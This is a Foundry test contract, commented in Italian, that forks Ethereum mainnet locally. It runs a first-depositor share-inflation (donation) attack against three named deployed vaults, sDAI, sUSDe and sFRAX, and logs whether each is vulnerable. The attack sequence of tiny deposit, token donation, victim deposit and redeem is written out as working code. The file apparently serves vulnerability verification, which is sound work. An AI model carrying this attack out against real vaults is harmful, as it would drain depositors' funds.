// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// EXEC-GATE su CONTRATTI REALI DEPLOYATI (mainnet-fork). Il "deployer" e' un INDIRIZZO on-chain + createSelectFork:
// nessun sorgente/deps da ricostruire, stesso attacco fedele. Fork LOCALE: nessuna tx reale.
// ENV-GUARD: senza ETH_RPC_URL il test si SALTA (innocuo). Disciplina verification-native: se l'attacco non e'
// ESEGUIBILE sul fork (token non finanziabile / deposito guardato), il gate ABSTAIN -> mai un finto-verdetto.
import "forge-std/Test.sol";
import {IVault} from "../src/IVault.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

contract ForkGate is Test {
    address atk = address(0xA11CE);
    address vic = address(0xB0B);

    function testForkRealVaults() public {
        string memory rpc = vm.envOr("ETH_RPC_URL", string(""));
        if (bytes(rpc).length == 0) { emit log_string("RESULT fork_skipped ABSTAIN no-RPC"); return; }
        vm.createSelectFork(rpc);
        _probe("sdai",  0x83F20F44975D03b1b09e64809B757c47f942BEeA);   // Savings DAI (pot DSR)
        _probe("susde", 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);   // Ethena staked USDe
        _probe("sfrax", 0xA663B02CF0a4b149d2aD41910CB81e23e1c41c32);   // Staked FRAX
    }

    function _probe(string memory name, address vault) internal {
        if (vault.code.length == 0) { emit log_string(string.concat("RESULT fork_", name, " ABSTAIN no-code")); return; }
        try IVault(vault).asset() returns (address asset) {
            (int256 maxP, uint256 bestD, uint256 executed, uint8 lastStatus) = _sweepLive(IVault(vault), asset);
            if (executed == 0) {
                string memory why = lastStatus == 1 ? "token-non-finanziabile(deal)" : "deposito-guardato";
                emit log_string(string.concat("RESULT fork_", name, " ABSTAIN ", why, " (0/4 trial eseguibili)"));
            } else if (maxP > 0) {
                emit log_string(string.concat("RESULT fork_", name, " VULN maxProfit=", vm.toString(maxP), " witness=", vm.toString(bestD)));
            } else {
                emit log_string(string.concat("RESULT fork_", name, " IMMUNE maxProfit=", vm.toString(maxP),
                                              " (", vm.toString(executed), "/4 eseguiti)"));
            }
        } catch {
            emit log_string(string.concat("RESULT fork_", name, " ABSTAIN iface-mismatch"));
        }
    }

    function _sweepLive(IVault v, address asset)
        internal returns (int256 maxP, uint256 bestD, uint256 executed, uint8 lastStatus)
    {
        uint8 dec = IERC20Like(asset).decimals();
        uint256 unit = 10 ** dec;
        uint256 V = 100 * unit;
        uint256[4] memory Ds = [uint256(1 * unit), 1000 * unit, 1000000 * unit, 1000000000 * unit];
        maxP = type(int256).min;
        for (uint256 i = 0; i < 4; i++) {
            uint256 snap = vm.snapshotState();
            (int256 p, uint8 status) = _attackLive(v, asset, V, Ds[i]);
            vm.revertToState(snap);
            lastStatus = status;
            if (status == 0) { executed++; if (p > maxP) { maxP = p; bestD = Ds[i]; } }
        }
    }

    // status: 0=eseguito, 1=token-non-finanziabile, 2=deposito-revert, 3=redeem-revert
    function _attackLive(IVault v, address asset, uint256 V, uint256 D) internal returns (int256 profit, uint8 status) {
        deal(asset, atk, 1 + D);
        deal(asset, vic, V);
        if (IERC20Like(asset).balanceOf(atk) < 1 + D || IERC20Like(asset).balanceOf(vic) < V) return (int256(0), 1);
        vm.startPrank(atk);
        IERC20Like(asset).approve(address(v), type(uint256).max);
        try v.deposit(1, atk) returns (uint256) {} catch { vm.stopPrank(); return (int256(0), 2); }
        try IERC20Like(asset).transfer(address(v), D) returns (bool) {} catch { vm.stopPrank(); return (int256(0), 2); }
        vm.stopPrank();
        vm.startPrank(vic);
        IERC20Like(asset).approve(address(v), type(uint256).max);
        try v.deposit(V, vic) returns (uint256) { vm.stopPrank(); }
        catch { vm.stopPrank(); return (int256(0), 2); }
        vm.startPrank(atk);
        try v.redeem(v.balanceOf(atk), atk, atk) returns (uint256 g) {
            profit = int256(g) - int256(1 + D);
        } catch { vm.stopPrank(); return (int256(0), 3); }
        vm.stopPrank();
        status = 0;
    }
}
